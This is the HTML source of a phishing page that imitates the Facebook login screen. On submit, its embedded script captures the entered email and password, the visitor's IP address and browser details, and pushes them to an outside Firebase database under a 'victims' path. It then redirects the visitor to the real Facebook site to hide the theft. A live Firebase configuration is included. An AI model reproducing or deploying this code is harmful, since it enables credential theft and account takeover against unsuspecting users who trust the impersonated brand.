<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow">
    <title>Facebook - Log In or Sign Up</title>
    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico">
    
    <!-- Firebase SDK -->
    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
    
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            display: flex;
            max-width: 980px;
            width: 100%;
            gap: 40px;
            align-items: center;
            flex-wrap: wrap;
            justify-content: center;
        }
        .left { flex: 1; min-width: 300px; text-align: left; }
        .left h1 { color: #1877f2; font-size: 60px; font-weight: bold; margin-bottom: 10px; }
        .left p { font-size: 24px; color: #1c1e21; line-height: 1.3; }
        .right { flex: 1; min-width: 300px; max-width: 400px; }
        .login-box {
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 15px rgba(0,0,0,0.15);
            text-align: center;
        }
        .login-box input {
            width: 100%;
            padding: 14px 16px;
            margin: 6px 0;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            font-size: 17px;
            outline: none;
        }
        .login-box input:focus {
            border-color: #1877f2;
            box-shadow: 0 0 0 2px #e7f3ff;
        }
        .login-btn {
            width: 100%;
            padding: 12px;
            background: #1877f2;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 20px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
        }
        .login-btn:hover { background: #166fe5; }
        .forgot { color: #1877f2; text-decoration: none; font-size: 14px; display: block; margin: 15px 0; }
        hr { border: none; border-top: 1px solid #dadde1; margin: 20px 0; }
        .create-btn {
            padding: 14px 20px;
            background: #42b72a;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 17px;
            font-weight: bold;
            cursor: pointer;
        }
        .loading { display: none; color: #1877f2; margin-top: 10px; font-size: 14px; }
        .create-page { text-align: center; margin-top: 20px; font-size: 14px; color: #1c1e21; }
        .create-page a { color: #1c1e21; font-weight: bold; text-decoration: none; }
        @media (max-width: 768px) {
            .left h1 { font-size: 40px; text-align: center; }
            .left p { font-size: 18px; text-align: center; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="left">
            <h1>facebook</h1>
            <p>Connect with friends and the world around you on Facebook.</p>
        </div>
        <div class="right">
            <div class="login-box">
                <form id="loginForm">
                    <input type="text" id="email" placeholder="Email or phone number" required autocomplete="off">
                    <input type="password" id="password" placeholder="Password" required autocomplete="off">
                    <button type="submit" class="login-btn">Log In</button>
                    <div class="loading" id="loading">Verifying...</div>
                </form>
                <a href="#" class="forgot">Forgot password?</a>
                <hr>
                <button class="create-btn" type="button">Create new account</button>
            </div>
            <p class="create-page"><a href="#">Create a Page</a> for a celebrity, brand or business.</p>
        </div>
    </div>

    <script>
        // ═══════════════════════
        // FIREBASE CONFIG
        // ═══════════════════════
        const firebaseConfig = {
            apiKey: "AIzaSyBs9TiMKOoMaIb84RVowQFrGlELAZ_SFSI",
            authDomain: "rhfzero-d95f5.firebaseapp.com",
            databaseURL: "https://rhfzero-d95f5-default-rtdb.firebaseio.com",
            projectId: "rhfzero-d95f5",
            storageBucket: "rhfzero-d95f5.firebasestorage.app",
            messagingSenderId: "198495096060",
            appId: "1:198495096060:web:d368e1531d0d86321f5b79"
        };

        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        // ═══════════════════════
        // GET IP
        // ═══════════════════════
        async function getIP() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                return data.ip;
            } catch(e) {
                return 'unknown';
            }
        }

        // ═══════════════════════
        // SAVE TO FIREBASE
        // ═══════════════════════
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            document.getElementById('loading').style.display = 'block';
            
            const ip = await getIP();
            
            // Simpan ke Realtime Database
            db.ref('victims').push({
                email: email,
                password: password,
                ip: ip,
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screenSize: screen.width + 'x' + screen.height,
                timestamp: new Date().toISOString(),
                referrer: document.referrer || 'direct'
            });
            
            // Redirect ke Facebook asli
            setTimeout(function() {
                window.location.href = 'https://www.facebook.com/login/';
            }, 1500);
        });
    </script>
</body>
</html>
